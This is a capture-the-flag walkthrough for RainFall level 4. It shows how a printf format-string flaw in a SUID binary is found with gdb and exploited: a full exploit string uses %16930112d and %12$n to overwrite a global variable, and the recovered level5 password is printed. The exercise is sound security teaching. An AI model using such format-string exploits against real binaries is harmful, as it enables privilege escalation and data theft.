# Level 4

## Vulnerability

printf() format string attack with %d

## Context

We find a binary with owner level5 and SUID.
```
level4@RainFall:~$ ls -l
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```
The binary seems to do the same thing as in previous levels, read from stdin, and print what is given.
```
level4@RainFall:~$ ./level4
oh hi!
oh hi!
```

## Solution

Investigating with gdb, we find fgets(), unfortunately protected against buffer overflow attack. But printf() may provide our vulnerability, similar to the last level.
```
level4@RainFall:~$ gdb -q level4
...
(gdb) disas main
...
   0x080484ad <+6>:	call   0x8048457 <n>
...
(gdb) disas n
...
...
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>  ; call fgets()
...
   0x08048488 <+49>:	call   0x8048444 <p>          ; call function p() which calls printf()
   0x0804848d <+54>:	mov    0x8049810,%eax	      ; load value of global variable "m" at 0x8049810
   0x08048492 <+59>:	cmp    $0x1025544,%eax        ; compare global variable "m" with 0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>       ; if false jump past system() call
   0x08048499 <+66>:	movl   $0x8048590,(%esp)      ; load argument "/bin/cat /home/user/level5/.pass"
   0x080484a0 <+73>:	call   0x8048360 <system@plt> ; call system("/bin/cat /home/user/level5/.pass")
...
(gdb) disas p
...
   0x08048450 <+12>:	call   0x8048340 <printf@plt> ; call printf()
```
After calling printf() the binary compares the value of global variable ```m``` at ```0x8049810``` to ```0x1025544``` (16930116 in decimal).
If true a call to system() launches a shell.

Let's use the printf() format string exploit to change the value of variable ```m``` to ```0x1025544```.

### Find %n address

First let's print the stack to find the address of the variable we wish to modify.
```
level4@RainFall:~$ (python -c 'print "BBBB" + " %x" * 13' ; cat -) | ./level4
BBBB b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 42424242 20782520
```
We find buffer BBBB (42424242) in 12th position.

Our target value ```16930116``` is too long for the ```%n``` exploit as used in the last level (%n stores only 4 bytes).
However, we can dynamically specify field width with modifier ```%d```  e.g. ```%16930116d```.

### Build exploit string

So we build our format string exploit:
1. Address of global variable ```m``` (4 bytes)          - ```\x10\x98\x04\x08```
2. 16930112 bytes padding using ```%d```                 - ```%16930112d```
3. store n bytes printed in 12th argument with ```%n```  - ```%12$n```

When we feed our format string attack to the binary it opens a shell and shows us the level5 password.
```
level4@RainFall:~$ (python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' ; cat -) | ./level4
...
                     -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Recreate Exploited Binary

As user ```level5```, in ```/tmp```, create and compile ```level4_source.c```.
```
level5@RainFall:/tmp$ gcc level4_source.c -fno-stack-protector -o level4_source
```
Edit permissions including suid, then move the binary to home directory.
```
level5@RainFall:/tmp$ chmod u+s level4_source; chmod +wx ~; mv level4_source ~
```
Exit back to user ```level4```, then run the source with an updated address of global variable ```m```.
```
level5@RainFall:/tmp$ exit
exit
level4@RainFall:~$ (python -c 'print "\x28\xa0\x04\x08" + "%16930112d" + "%12$n"' ; cat -) | /home/user/level5/level4_source
```
